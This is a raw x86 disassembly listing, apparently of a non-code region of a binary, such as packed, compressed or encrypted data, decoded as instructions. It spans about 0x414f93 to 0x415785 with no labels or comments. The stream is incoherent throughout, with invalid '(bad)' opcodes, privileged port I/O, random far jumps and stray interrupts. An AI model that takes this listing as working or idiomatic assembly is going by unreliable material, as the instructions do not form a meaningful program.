  414f93:	ror    DWORD PTR [ebx-0x14],0x11
  414f97:	push   ds
  414f98:	test   al,0x17
  414f9a:	movhps xmm0,QWORD PTR [edx+0x39]
  414f9e:	int    0x97
  414fa0:	jecxz  0x414f8a
  414fa2:	es int3 
  414fa4:	shl    DWORD PTR [esi-0x34],0x50
  414fa8:	dec    esi
  414fa9:	inc    esp
  414faa:	mov    dh,ah
  414fac:	fs inc ebp
  414fae:	clc    
  414faf:	in     eax,dx
  414fb0:	mov    cl,0xa0
  414fb2:	in     al,dx
  414fb3:	aam    0xc7
  414fb5:	addr16 cmc 
  414fb7:	aad    0x2c
  414fb9:	and    al,0x17
  414fbb:	jle    0x414f94
  414fbd:	jno    0x414f54
  414fbf:	sub    esi,DWORD PTR [ebx]
  414fc1:	jge    0x414f5e
  414fc3:	lahf   
  414fc4:	add    BYTE PTR [edi-0x28],bh
  414fc7:	fwait
  414fc8:	mov    ds:0x7bc601a7,al
  414fcd:	cmp    al,0x69
  414fcf:	pushf  
  414fd0:	out    dx,al
  414fd1:	and    DWORD PTR [eax],esp
  414fd3:	jnp    0x414ff2
  414fd5:	jp     0x41504e
  414fd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414fd8:	mov    ss,ebx
  414fda:	outs   dx,DWORD PTR ds:[esi]
  414fdb:	sbb    esi,0xffffffb2
  414fde:	jnp    0x414f74
  414fe0:	jb     0x414fac
  414fe2:	jle    0x415061
  414fe4:	inc    ecx
  414fe5:	stos   DWORD PTR es:[edi],eax
  414fe6:	neg    DWORD PTR [edx+edi*4-0x72]
  414fea:	xor    BYTE PTR ds:0xb639035a,bh
  414ff0:	mul    al
  414ff2:	fst    QWORD PTR [ecx+0x1c230b3d]
  414ff8:	cmp    esp,eax
  414ffa:	fs ins BYTE PTR es:[edi],dx
  414ffc:	js     0x415075
  414ffe:	inc    ebx
  414fff:	rcl    BYTE PTR [ecx-0x21],1
  415002:	test   DWORD PTR [edx-0x34],ebx
  415005:	mov    ebp,0x3be69325
  41500a:	push   esi
  41500b:	jle    0x415064
  41500d:	test   al,0x8
  41500f:	push   0xb0105da5
  415014:	shl    DWORD PTR [esi+0x24],1
  415017:	push   ebx
  415018:	sub    BYTE PTR ds:0x137e5e7d,dh
  41501e:	addr16 cs test eax,0x13d28990
  415025:	and    al,0x7a
  415027:	pop    ds
  415028:	dec    ebx
  415029:	shl    BYTE PTR [edx],1
  41502b:	lock in eax,dx
  41502d:	fcomp  st(0)
  41502f:	inc    ebp
  415030:	sahf   
  415031:	cld    
  415032:	xrelease xchg BYTE PTR [esi-0x71],al
  415036:	rol    DWORD PTR [ecx+esi*1],cl
  415039:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41503a:	neg    DWORD PTR [eax]
  41503c:	xchg   BYTE PTR [esi-0x77c5a976],ch
  415042:	dec    esp
  415043:	xchg   BYTE PTR [ebp-0x5c],cl
  415046:	or     DWORD PTR [ecx],esi
  415048:	sub    ebp,edi
  41504a:	loope  0x4150b8
  41504c:	lds    esi,FWORD PTR [eax]
  41504e:	inc    eax
  41504f:	mov    ch,0x9f
  415051:	lea    esi,[ebp+0x23]
  415054:	pop    ecx
  415055:	dec    esi
  415056:	mov    al,ds:0x2576d23f
  41505b:	cmp    DWORD PTR fs:[eax],0xffffffa9
  41505f:	fsubr  QWORD PTR [ecx+0x4c13c5c9]
  415065:	into   
  415066:	aaa    
  415067:	(bad)  
  415068:	loope  0x415039
  41506a:	sbb    eax,edx
  41506c:	sbb    DWORD PTR [ebx+0x65],ebp
  41506f:	out    0x14,eax
  415071:	aam    0xd4
  415073:	add    dl,BYTE PTR [edi-0x79a1ac32]
  415079:	pop    ecx
  41507a:	sbb    dl,cl
  41507c:	inc    edx
  41507d:	into   
  41507e:	and    eax,0xf2a823f0
  415083:	mov    esi,0x3649d4ba
  415088:	out    0x5b,eax
  41508a:	sub    edx,eax
  41508c:	mov    ds:0x420fbce0,eax
  415091:	push   ds
  415092:	test   BYTE PTR [ebp+ebx*2-0x4cb03475],0x5a
  41509a:	xchg   esp,eax
  41509b:	(bad)  
  41509c:	fild   DWORD PTR [eax+eiz*8-0x50]
  4150a0:	or     dh,bl
  4150a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4150a3:	or     eax,0xafd0fd3a
  4150a8:	int    0x6
  4150aa:	mov    ?,WORD PTR [edi-0x4e]
  4150ad:	xchg   esi,eax
  4150ae:	push   esi
  4150af:	out    dx,al
  4150b0:	fwait
  4150b1:	jmp    0x9487:0xdb044cc
  4150b8:	ret    0xd8f7
  4150bb:	ret    0x710e
  4150be:	imul   edx,DWORD PTR [esi-0xe],0xf
  4150c2:	popa   
  4150c3:	retf   
  4150c4:	pop    ecx
  4150c5:	or     DWORD PTR [ecx],ebx
  4150c7:	leave  
  4150c8:	ins    DWORD PTR es:[edi],dx
  4150c9:	mov    ecx,0x37e2e144
  4150ce:	mov    eax,0xd87252e3
  4150d3:	mov    cl,0xf9
  4150d5:	mov    eax,ds:0x6384f50d
  4150da:	mov    edi,0xb0204567
  4150df:	shr    BYTE PTR [edi+ebp*8],1
  4150e2:	int3   
  4150e3:	int    0x6c
  4150e5:	pop    ecx
  4150e6:	hlt    
  4150e7:	inc    esi
  4150e8:	stos   DWORD PTR es:[edi],eax
  4150e9:	(bad)  
  4150ea:	mov    ebx,0xc8e8c75b
  4150ef:	sub    bh,BYTE PTR [edi]
  4150f1:	mov    eax,0x8bee9ece
  4150f6:	ss push ecx
  4150f8:	pop    edx
  4150f9:	stc    
  4150fa:	fidiv  DWORD PTR [edx+eax*2+0x2575bdd1]
  415101:	xor    ebp,DWORD PTR [ecx]
  415103:	lds    edx,FWORD PTR [edi+0x45f2fe19]
  415109:	mov    cl,0x80
  41510b:	cmc    
  41510c:	inc    edx
  41510d:	mov    bl,0xe5
  41510f:	and    ah,bl
  415111:	loope  0x415150
  415113:	sub    edi,DWORD PTR [ecx+esi*2-0x4343f8e5]
  41511a:	sub    dh,BYTE PTR [ecx+0x733a7f05]
  415120:	push   ecx
  415121:	cli    
  415122:	ins    BYTE PTR es:[edi],dx
  415123:	(bad)  
  415125:	loope  0x415183
  415127:	cli    
  415128:	pop    esi
  415129:	ret    0x7b73
  41512c:	jg     0x415109
  41512e:	mov    edi,0x611d32d7
  415133:	loopne 0x4150b9
  415135:	fild   WORD PTR [esp-0x49]
  415139:	aaa    
  41513a:	sbb    eax,0x361a9f19
  41513f:	add    al,0x1a
  415141:	xor    esi,0xffffffa1
  415144:	pop    esp
  415145:	push   ebx
  415146:	jo     0x415101
  415148:	xchg   ebp,eax
  415149:	test   eax,0xe181d075
  41514e:	aam    0x29
  415150:	mul    BYTE PTR [ebp-0x58]
  415153:	out    dx,al
  415154:	add    ah,BYTE PTR [ebx+0x7f9fe575]
  41515a:	fs stc 
  41515c:	outs   dx,DWORD PTR ds:[esi]
  41515d:	adc    eax,0x437d09bf
  415162:	int    0x86
  415164:	push   ecx
  415165:	pop    es
  415166:	call   0x1121:0xd94c5d3f
  41516d:	push   0x1d
  41516f:	xchg   BYTE PTR [ebx-0x14cc80b4],bl
  415175:	mov    bl,0x1
  415177:	mov    al,0xaa
  415179:	outs   dx,DWORD PTR ds:[esi]
  41517a:	push   ss
  41517b:	xchg   BYTE PTR ds:0xf8768bb7,bl
  415181:	aad    0x6f
  415183:	jg     0x415147
  415185:	fs sub ebp,0xe241b2c1
  41518c:	rcr    cl,1
  41518e:	icebp  
  41518f:	rol    BYTE PTR [eax-0x52],cl
  415192:	jo     0x4151c6
  415194:	mov    esp,0x9073ff42
  415199:	adc    esi,esi
  41519b:	mov    eax,0xbf07e649
  4151a0:	ret    0xa55a
  4151a3:	cmp    edx,DWORD PTR [ebx+0x632de8b1]
  4151a9:	sub    dl,0x5e
  4151ac:	lea    edi,ss:[ebp-0x4]
  4151b0:	add    BYTE PTR [eax-0x21ea1b1d],0xa3
  4151b7:	test   BYTE PTR [esp+eiz*4+0x53],0xcc
  4151bc:	hlt    
  4151bd:	adc    BYTE PTR [edx],0x81
  4151c0:	iret   
  4151c1:	aad    0xf2
  4151c3:	rcr    DWORD PTR [ebx-0x35],0xfc
  4151c7:	adc    ecx,DWORD PTR [ecx+0x2d]
  4151ca:	mov    al,ds:0x376e15c5
  4151cf:	imul   esp,esi,0xffffffd3
  4151d2:	sbb    BYTE PTR [edi+ecx*8-0x2e],ch
  4151d6:	lock dec ebx
  4151d8:	aas    
  4151d9:	adc    DWORD PTR [ebx-0x6905997a],0xffffffd5
  4151e0:	and    DWORD PTR [edi],ebx
  4151e2:	icebp  
  4151e3:	imul   ebp,DWORD PTR [esi+edx*4+0x17],0xf254c399
  4151eb:	sub    ah,0x18
  4151ee:	sbb    eax,0x483bbeab
  4151f3:	adc    bh,BYTE PTR [edi]
  4151f5:	sbb    esi,ebx
  4151f7:	pushf  
  4151f8:	mov    al,0xc7
  4151fa:	mov    dh,0x98
  4151fc:	dec    edi
  4151fd:	mov    bh,0x57
  4151ff:	adc    DWORD PTR [ecx+0x46],esi
  415202:	lods   eax,DWORD PTR ds:[esi]
  415203:	jae    0x415215
  415205:	push   esi
  415206:	xchg   esi,eax
  415207:	pop    ebx
  415208:	mov    dl,0x9e
  41520a:	ins    BYTE PTR es:[edi],dx
  41520b:	sbb    eax,0x858c2931
  415210:	shr    BYTE PTR [edx],0x1f
  415213:	cmp    ebx,DWORD PTR [ebp-0x6e]
  415216:	in     al,0xe6
  415218:	dec    eax
  415219:	mov    bl,0x79
  41521b:	popa   
  41521c:	xor    eax,0x61471ad4
  415221:	hlt    
  415222:	mov    bh,0xdd
  415224:	rol    DWORD PTR [edi],0xae
  415227:	out    0xef,al
  415229:	loope  0x41524c
  41522b:	jne    0x4151dd
  41522d:	push   ebp
  41522e:	call   0xd1cea5eb
  415233:	mov    al,ds:0xe0ae71e0
  415238:	(bad)  
  415239:	mov    al,0xb8
  41523b:	inc    edx
  41523c:	add    al,0x8e
  41523e:	mov    dl,0x9b
  415240:	or     DWORD PTR [ecx+0x7d1fe9f1],edx
  415246:	jno    0x41526b
  415248:	sahf   
  415249:	jno    0x4152c5
  41524b:	mov    cs,WORD PTR [esi+0x30000d03]
  415251:	add    al,0xe9
  415253:	dec    esp
  415254:	or     eax,0x47530d52
  415259:	and    BYTE PTR ds:0x4eabef71,cl
  41525f:	sar    DWORD PTR [edx-0x46],cl
  415262:	popa   
  415263:	xchg   BYTE PTR [eax+esi*1],dl
  415266:	or     BYTE PTR [esi],ah
  415268:	push   ebp
  415269:	adc    ebx,edi
  41526b:	scas   eax,DWORD PTR es:[edi]
  41526c:	fcmovbe st,st(2)
  41526e:	push   edi
  41526f:	in     al,0x7e
  415271:	jno    0x4152ab
  415273:	imul   ecx,DWORD PTR [ecx+0x60f4642a],0x58
  41527a:	(bad)
  41527e:	push   0xffffff8e
  415280:	push   ecx
  415281:	rcr    cl,0xcb
  415284:	mov    cl,0x53
  415286:	pop    ebp
  415287:	xchg   esi,eax
  415288:	jbe    0x4152e0
  41528a:	das    
  41528b:	or     BYTE PTR [esi+0x3c],dh
  41528e:	test   BYTE PTR [eax+ecx*2+0x383b140f],0x80
  415296:	adc    eax,0xcf03a759
  41529b:	or     ebp,ebx
  41529d:	es aad 0xd2
  4152a0:	out    dx,al
  4152a1:	pop    es
  4152a2:	sbb    bl,BYTE PTR [edx+0x8e938e6]
  4152a8:	loope  0x41523d
  4152aa:	dec    esi
  4152ab:	push   ecx
  4152ac:	cmc    
  4152ad:	test   eax,0x581a33c2
  4152b2:	addr16 cmc 
  4152b4:	jbe    0x415284
  4152b6:	stc    
  4152b7:	pop    esi
  4152b8:	dec    ebx
  4152b9:	jle    0x415331
  4152bb:	fwait
  4152bc:	and    cl,al
  4152be:	cmp    al,0x2e
  4152c0:	into   
  4152c1:	loope  0x4152b8
  4152c3:	ror    DWORD PTR [eax-0x3d],cl
  4152c6:	into   
  4152c7:	rol    DWORD PTR [eax+esi*1],1
  4152ca:	int    0x18
  4152cc:	js     0x415330
  4152ce:	fdivr  QWORD PTR [esi-0x75]
  4152d1:	fiadd  WORD PTR [ecx+eiz*4]
  4152d4:	jg     0x41534f
  4152d6:	sbb    cl,ch
  4152d8:	or     ebp,DWORD PTR [edx+ecx*4]
  4152db:	mov    cl,0x10
  4152dd:	ds sbb eax,0x27d778ea
  4152e3:	aam    0xc2
  4152e5:	cdq    
  4152e6:	jb     0x415283
  4152e8:	stos   BYTE PTR es:[edi],al
  4152e9:	inc    eax
  4152ea:	or     esp,DWORD PTR [esi+0xf808801]
  4152f0:	sub    dl,0x74
  4152f3:	jno    0x4152ae
  4152f5:	mov    ss,edx
  4152f7:	call   0xae0664b8
  4152fc:	es mov ebp,esi
  4152ff:	or     ah,BYTE PTR [edi+0x59872a9c]
  415305:	mov    edi,0xef56308a
  41530a:	jg     0x4152ba
  41530c:	in     eax,0xb5
  41530e:	into   
  41530f:	shr    DWORD PTR [edi+0x67005171],1
  415315:	js     0x415325
  415317:	dec    esi
  415318:	(bad)  
  415319:	or     DWORD PTR [esi-0x11],ecx
  41531c:	in     eax,0xa2
  41531e:	loope  0x415380
  415320:	inc    ecx
  415321:	out    dx,eax
  415322:	and    cl,BYTE PTR [edi]
  415324:	inc    ebx
  415325:	jle    0x41538a
  415327:	cmp    edx,DWORD PTR [edx+0x62]
  41532a:	in     al,dx
  41532b:	sub    eax,0x4bb69d8
  415330:	je     0x41539d
  415332:	loop   0x415390
  415334:	jmp    0x12a9:0x908b3e04
  41533b:	sahf   
  41533c:	cmp    al,0x65
  41533e:	stos   DWORD PTR es:[edi],eax
  41533f:	(bad)  
  415341:	fsub   DWORD PTR [ecx-0x31]
  415344:	xlat   BYTE PTR ds:[ebx]
  415345:	es push 0xfffffff7
  415348:	pop    eax
  415349:	outs   dx,DWORD PTR ds:[esi]
  41534a:	and    eax,0xa73cd256
  41534f:	jg     0x41536e
  415351:	stos   BYTE PTR es:[edi],al
  415352:	cmp    eax,0x32d065aa
  415357:	iret   
  415358:	pop    DWORD PTR [edx+eax*2]
  41535b:	and    BYTE PTR [ebp-0x64f40292],ch
  415361:	inc    ebp
  415362:	and    dh,BYTE PTR gs:[edi-0x48]
  415366:	sbb    BYTE PTR [ebp+0x46dd3629],dh
  41536c:	and    al,0x62
  41536e:	std    
  41536f:	or     ecx,DWORD PTR [ebx-0x6c]
  415372:	pmulhuw mm7,QWORD PTR ds:[ecx+0x10]
  415377:	(bad)  
  415378:	scas   al,BYTE PTR es:[edi]
  415379:	mov    ah,0x50
  41537b:	jge    0x4153ab
  41537d:	cmp    bl,BYTE PTR [eax]
  41537f:	test   eax,0x1eef6424
  415384:	jmp    0xe136:0xa28748cf
  41538b:	int    0xc2
  41538d:	fs push ebp
  41538f:	fild   DWORD PTR [ecx+0xb85c454]
  415395:	and    bh,dh
  415397:	lock in eax,dx
  415399:	cmp    bh,BYTE PTR ds:0x2f994e87
  41539f:	jmp    0x415334
  4153a1:	fcmovnbe st,st(6)
  4153a3:	dec    ebx
  4153a4:	adc    eax,0xb14a848c
  4153a9:	inc    ebp
  4153aa:	mov    bh,0x88
  4153ac:	xor    DWORD PTR [eax-0x32],eax
  4153af:	mov    esp,DWORD PTR [ebx]
  4153b1:	and    BYTE PTR [ecx+0x9],ch
  4153b4:	rcr    BYTE PTR [edx+0x2538261c],1
  4153ba:	pop    es
  4153bb:	test   eax,0x40581a4d
  4153c0:	sbb    BYTE PTR [edx-0x761e84bc],ah
  4153c6:	ds mov ah,0xac
  4153c9:	sub    ebx,edi
  4153cb:	and    bl,al
  4153cd:	inc    esi
  4153ce:	or     eax,0x41e2e79a
  4153d3:	xchg   edi,eax
  4153d4:	js     0x415412
  4153d6:	rol    DWORD PTR [esi-0x3727facc],1
  4153dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4153dd:	loop   0x415401
  4153df:	inc    eax
  4153e0:	(bad)  
  4153e1:	fdiv   st,st(7)
  4153e3:	xchg   edx,eax
  4153e4:	push   edx
  4153e5:	mov    cl,0xd
  4153e7:	adc    esi,ebp
  4153e9:	dec    ebx
  4153ea:	sbb    ecx,DWORD PTR [ecx-0x69]
  4153ed:	js     0x415453
  4153ef:	jnp    0x4153e4
  4153f1:	push   0x78c66ebc
  4153f6:	cmp    DWORD PTR [edi],ebp
  4153f8:	mov    WORD PTR [ebx],es
  4153fa:	xor    al,0x75
  4153fc:	jne    0x41541d
  4153fe:	sbb    eax,0x99482255
  415403:	push   esi
  415404:	in     eax,dx
  415405:	pop    edi
  415406:	add    eax,0x5cad0e15
  41540b:	xor    al,0x2a
  41540d:	fwait
  41540e:	int    0x66
  415410:	ins    BYTE PTR es:[edi],dx
  415411:	daa    
  415412:	dec    esp
  415413:	push   es
  415414:	fisubr WORD PTR [esi-0x53]
  415417:	pop    ebx
  415418:	jg     0x415436
  41541a:	xor    dh,BYTE PTR [esi]
  41541c:	mov    ecx,eax
  41541e:	pop    ebx
  41541f:	in     eax,dx
  415420:	mov    BYTE PTR [ebp-0x4],bh
  415423:	or     al,0xdc
  415425:	fnstenv [esi]
  415427:	cmc    
  415428:	add    eax,edx
  41542a:	inc    ebp
  41542b:	sbb    DWORD PTR [esi+0x4e],ebx
  41542e:	imul   ebx,edx,0xb449d11c
  415434:	mov    ebp,0x97c3c31d
  415439:	mov    ds:0x3beed0d1,eax
  41543e:	mov    ch,ch
  415440:	push   0xd825f7ee
  415445:	imul   ebx,DWORD PTR [ebx-0x1f131469],0xb5c9ab5a
  41544f:	mov    al,0x24
  415451:	sub    DWORD PTR [esi],eax
  415453:	push   esp
  415454:	inc    eax
  415455:	xor    DWORD PTR [ebx],eax
  415457:	sti    
  415458:	add    eax,ebp
  41545a:	xor    DWORD PTR [eax+0x29],0xffffff8d
  41545e:	in     eax,0x8d
  415460:	inc    esp
  415461:	(bad)  
  415462:	call   0x927e:0xce59870
  415469:	push   edi
  41546a:	push   ebp
  41546b:	jae    0x41547b
  41546d:	cmp    al,0x56
  41546f:	push   edi
  415470:	je     0x415488
  415472:	cmp    edx,edi
  415474:	adc    DWORD PTR [ecx-0x31],esp
  415477:	or     eax,0xe36b8588
  41547c:	cli    
  41547d:	mov    esp,0xaabc9b79
  415482:	and    DWORD PTR [esi*8+0x20e53ca],0x5d388cf3
  41548d:	test   eax,0xb7fc119b
  415492:	outs   dx,BYTE PTR ds:[esi]
  415493:	std    
  415494:	jle    0x415442
  415496:	xor    dl,0xdb
  415499:	inc    ebp
  41549a:	mov    ds:0x9b4fec9b,al
  41549f:	xor    eax,0xb69b22
  4154a4:	cld    
  4154a5:	test   BYTE PTR [edx-0x63],dl
  4154a8:	or     dh,BYTE PTR ds:[ecx]
  4154ab:	xor    al,0x99
  4154ad:	mov    ds:0xb7a006f8,eax
  4154b2:	push   0xbef1e406
  4154b7:	retf   0x7594
  4154ba:	out    0x89,eax
  4154bc:	in     eax,dx
  4154bd:	lods   al,BYTE PTR ds:[esi]
  4154be:	adc    al,0xfe
  4154c0:	add    ecx,edi
  4154c2:	inc    esp
  4154c3:	in     al,0x1a
  4154c5:	fsubp  st(5),st
  4154c7:	popa   
  4154c8:	and    BYTE PTR [edx+0x72f49c95],ah
  4154ce:	pop    ss
  4154cf:	or     edi,eax
  4154d1:	sar    DWORD PTR [edx+0x299b9023],cl
  4154d7:	and    DWORD PTR [edx+eiz*1+0x746e505e],eax
  4154de:	out    0xf9,al
  4154e0:	jmp    0x32ab:0x8864e3d9
  4154e7:	push   ebp
  4154e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4154e9:	shl    DWORD PTR [eax],cl
  4154eb:	mov    ds:0x7573cb58,al
  4154f0:	jg     0x4154d3
  4154f2:	addr16 div edx
  4154f5:	pop    eax
  4154f6:	pop    edx
  4154f7:	(bad)  
  4154f8:	xchg   ebp,eax
  4154f9:	adc    DWORD PTR [ebx+ebx*2-0x255bc897],edx
  415500:	lods   eax,DWORD PTR ds:[esi]
  415501:	sbb    BYTE PTR [edx+0x462e75e4],dh
  415507:	addr16 pmaddwd mm1,mm5
  41550b:	or     eax,0x92a1b61
  415510:	mov    eax,ds:0x2aa990ec
  415515:	clc    
  415516:	test   eax,0xba542f4b
  41551b:	pop    ds
  41551c:	das    
  41551d:	push   ecx
  41551e:	mov    cl,0xca
  415520:	jne    0x415526
  415522:	les    eax,FWORD PTR [edx-0x1f]
  415525:	jge    0x4155a6
  415527:	shl    bl,1
  415529:	mov    DWORD PTR [esp+edi*2+0x2f164e93],ebx
  415530:	jmp    0x903aba07
  415535:	cmp    al,0xfd
  415537:	les    edx,FWORD PTR [edx-0x60f8a8d4]
  41553d:	inc    eax
  41553e:	push   ebx
  41553f:	cmp    BYTE PTR [edx-0x1e],al
  415542:	jge    0x4155b3
  415544:	rcr    ch,0x7d
  415547:	xchg   ebx,eax
  415548:	std    
  415549:	popa   
  41554a:	sub    al,0xeb
  41554c:	jno    0x415505
  41554e:	or     ebp,esp
  415550:	adc    eax,0x554d3352
  415555:	fisttp QWORD PTR gs:[eax+0x14]
  415559:	stc    
  41555a:	push   0x65
  41555c:	js     0x415556
  41555e:	sub    ebp,0xffffff95
  415561:	stc    
  415562:	sub    eax,DWORD PTR [ecx]
  415564:	inc    ebp
  415565:	mov    ch,0x1a
  415567:	mov    WORD PTR [edi+0x229e8f34],?
  41556d:	or     bl,ch
  41556f:	sub    al,0x6f
  415571:	jnp    0x415511
  415573:	cli    
  415574:	inc    edx
  415575:	push   edi
  415576:	cmp    al,BYTE PTR [ecx+edx*4-0x45123190]
  41557d:	inc    ebx
  41557e:	retf   0x209e
  415581:	mov    ch,0xb7
  415583:	cvtps2pi mm1,QWORD PTR [esi]
  415586:	rcl    BYTE PTR [ebx-0x40],0x65
  41558a:	jae    0x4155d5
  41558c:	(bad)  
  41558d:	push   0x14
  41558f:	mov    esi,0x14cf6490
  415594:	xor    al,0xa6
  415596:	push   eax
  415597:	dec    edx
  415598:	sbb    al,al
  41559a:	dec    ecx
  41559b:	jl     0x4155c3
  41559d:	push   ebp
  41559e:	mov    cl,bl
  4155a0:	cmp    eax,0xe51c900c
  4155a5:	inc    edi
  4155a6:	adc    ebx,DWORD PTR [edi]
  4155a8:	mov    ebx,0x7d79f558
  4155ad:	repz cld 
  4155af:	fstp   DWORD PTR [eax-0x34]
  4155b2:	xor    al,0x11
  4155b4:	stos   BYTE PTR es:[edi],al
  4155b5:	cmp    BYTE PTR [ebp+0x2fdbdd62],0xff
  4155bc:	inc    edx
  4155bd:	loope  0x4155c1
  4155bf:	in     eax,dx
  4155c0:	ins    DWORD PTR es:[edi],dx
  4155c1:	adc    BYTE PTR [edx-0x460dcf3c],0x3f
  4155c8:	xor    edx,DWORD PTR [ebp-0xd]
  4155cb:	mov    cl,0x1a
  4155cd:	je     0x415624
  4155cf:	outs   dx,BYTE PTR ds:[esi]
  4155d0:	imul   ecx,DWORD PTR [edx-0x1b625a44],0x8c337f03
  4155da:	cmp    ecx,esp
  4155dc:	mov    es,WORD PTR [edi+0x76]
  4155df:	lea    ebx,[eax+0x2c0f5198]
  4155e5:	push   ds
  4155e6:	mov    bh,0xff
  4155e8:	add    eax,DWORD PTR [esi]
  4155ea:	pop    eax
  4155eb:	clc    
  4155ec:	push   0xffffffa6
  4155ee:	xor    BYTE PTR [ebx-0xf1cd988],bh
  4155f4:	icebp  
  4155f5:	into   
  4155f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4155f7:	or     eax,0x8a9de9bc
  4155fc:	cmp    dh,0xeb
  4155ff:	fbld   TBYTE PTR [edi]
  415601:	mov    ebp,0xf55c3b50
  415606:	mov    ds:0x284cc448,al
  41560b:	jg     0x41566e
  41560d:	sub    al,0xad
  41560f:	cmp    DWORD PTR [ecx+esi*1],0xfffffff4
  415613:	in     eax,dx
  415614:	dec    DWORD PTR [eax]
  415616:	pop    ebp
  415617:	mov    ecx,edi
  415619:	pop    eax
  41561a:	test   eax,0x2f63f1d4
  41561f:	out    dx,al
  415620:	inc    edx
  415621:	cmc    
  415622:	lods   eax,DWORD PTR ds:[esi]
  415623:	scas   eax,DWORD PTR es:[edi]
  415624:	inc    ebp
  415625:	dec    ebp
  415626:	pop    edi
  415627:	not    DWORD PTR ds:[eax+ebx*4-0x35bb1dc4]
  41562f:	sbb    DWORD PTR [edi+eiz*8],esp
  415632:	xchg   esp,eax
  415633:	pop    ss
  415634:	out    0xa3,al
  415636:	push   edi
  415637:	into   
  415638:	jmp    DWORD PTR [ebx-0x21]
  41563b:	xor    edx,esi
  41563d:	and    ecx,eax
  41563f:	push   es
  415640:	ins    DWORD PTR es:[edi],dx
  415641:	jecxz  0x4156b2
  415643:	mov    ds:0xfc17687f,eax
  415648:	loope  0x415693
  41564a:	daa    
  41564b:	pop    esp
  41564c:	sti    
  41564d:	pop    ds
  41564e:	xchg   edi,eax
  41564f:	es test al,0x39
  415652:	mov    WORD PTR [esi-0x1a],cs
  415655:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415656:	push   ebx
  415657:	rol    BYTE PTR [edx-0x4ee88a0e],cl
  41565d:	cmp    esp,DWORD PTR [eax]
  41565f:	pop    eax
  415660:	pop    ebp
  415661:	sub    dl,BYTE PTR [edx]
  415663:	jne    0x4155ea
  415665:	aaa    
  415666:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415667:	mov    ds:0xf908860b,al
  41566c:	popa   
  41566d:	fcom   QWORD PTR ds:0x328c74fa
  415673:	cmp    al,0x79
  415675:	or     DWORD PTR [ecx+eax*8],ebp
  415678:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415679:	or     bl,BYTE PTR [eax+0x34]
  41567c:	inc    esp
  41567d:	shr    BYTE PTR [ebx-0x5e],0xa3
  415681:	enter  0x3a58,0x36
  415685:	(bad)  
  415686:	jp     0x4156b1
  415688:	mov    edi,0xe5479427
  41568d:	sub    al,0xeb
  41568f:	(bad)  
  415690:	loope  0x415632
  415692:	cmp    DWORD PTR [ebp-0x1a],esp
  415695:	addr16 pop edx
  415697:	rcr    esp,1
  415699:	rcl    BYTE PTR [edi+edi*4],0xb5
  41569d:	aas    
  41569e:	jge    0x415655
  4156a0:	addr16 test eax,0x322213b3
  4156a6:	adc    al,0xab
  4156a8:	mov    edi,0xd963d30f
  4156ad:	xchg   esp,eax
  4156ae:	pop    es
  4156af:	(bad)  
  4156b0:	jl     0x41569e
  4156b2:	xchg   esi,eax
  4156b3:	push   ss
  4156b4:	sub    ah,dl
  4156b6:	add    eax,0xae0b04ec
  4156bb:	out    dx,eax
  4156bc:	das    
  4156bd:	push   ebx
  4156be:	inc    esp
  4156bf:	out    dx,al
  4156c0:	daa    
  4156c1:	test   esp,esi
  4156c3:	pop    ecx
  4156c4:	dec    ebx
  4156c5:	jecxz  0x4156f3
  4156c7:	stos   BYTE PTR es:[edi],al
  4156c8:	jae    0x41572b
  4156ca:	fidivr DWORD PTR [ebx-0x80f3f78]
  4156d0:	pop    ds
  4156d1:	xchg   edi,eax
  4156d2:	pop    esp
  4156d3:	ss dec edx
  4156d5:	outs   dx,BYTE PTR ds:[esi]
  4156d6:	out    dx,eax
  4156d7:	cs xchg ebp,eax
  4156d9:	int3   
  4156da:	pop    esi
  4156db:	add    ebp,DWORD PTR [ebx]
  4156dd:	je     0x4156ab
  4156df:	or     dh,BYTE PTR [ebx+0x22]
  4156e2:	je     0x4156da
  4156e4:	mov    edi,0x591c14bd
  4156e9:	cdq    
  4156ea:	fadd   st(7),st
  4156ec:	lods   eax,DWORD PTR ds:[esi]
  4156ed:	or     DWORD PTR [ecx+edi*8],eax
  4156f0:	xor    bl,BYTE PTR [eax+0x4e]
  4156f3:	add    cl,BYTE PTR [ebx]
  4156f5:	or     dl,BYTE PTR [esp+eax*4-0x12122316]
  4156fc:	pop    esp
  4156fd:	imul   esp,DWORD PTR ds:0xee89bc8e,0xb6d45a4a
  415707:	mov    eax,0xde77df60
  41570c:	pop    edi
  41570d:	cmc    
  41570e:	cmp    bl,BYTE PTR [ecx]
  415710:	ja     0x415697
  415712:	jg     0x415745
  415714:	test   DWORD PTR [ebx+0x41],edx
  415717:	gs jmp 0xdb8d:0x8d9fc95
  41571f:	mov    bh,cl
  415721:	mov    ebx,0x461ba71
  415726:	(bad)  
  415727:	jle    0x415739
  415729:	push   ss
  41572a:	lods   eax,DWORD PTR ds:[esi]
  41572b:	push   ebx
  41572c:	scas   al,BYTE PTR es:[edi]
  41572d:	mov    cl,0x6a
  41572f:	in     eax,0x42
  415731:	mov    edi,0x45b4b991
  415736:	mov    WORD PTR [ecx-0x6ec97070],?
  41573c:	jp     0x4156f3
  41573e:	push   es
  41573f:	dec    ecx
  415740:	shl    WORD PTR [eax+edi*4],cl
  415744:	repz or DWORD PTR [ebx+edx*2+0x73],ebx
  415749:	scas   al,BYTE PTR es:[edi]
  41574a:	(bad)  
  41574b:	loop   0x415779
  41574d:	dec    ebx
  41574e:	test   al,0xd4
  415750:	sti    
  415751:	mov    al,ds:0x40b4e474
  415756:	xor    esi,DWORD PTR [edi+0x5a096407]
  41575c:	or     dh,0x8d
  41575f:	scas   al,BYTE PTR es:[edi]
  415760:	mov    al,0xf
  415762:	add    dl,BYTE PTR [ecx-0x49]
  415765:	jmp    0xff29f36c
  41576a:	push   ecx
  41576b:	sub    BYTE PTR [eax+0x3a],dl
  41576e:	popf   
  41576f:	add    eax,0xd03d8a6d
  415774:	pop    ebx
  415775:	add    eax,DWORD PTR [ebp+ebx*8-0x420cd0a]
  41577c:	lds    edi,FWORD PTR [eax*1-0x1aa4b410]
  415783:	or     eax,DWORD PTR [edx]
  415785:	shl    BYTE PTR [esp+eax*1],0x93
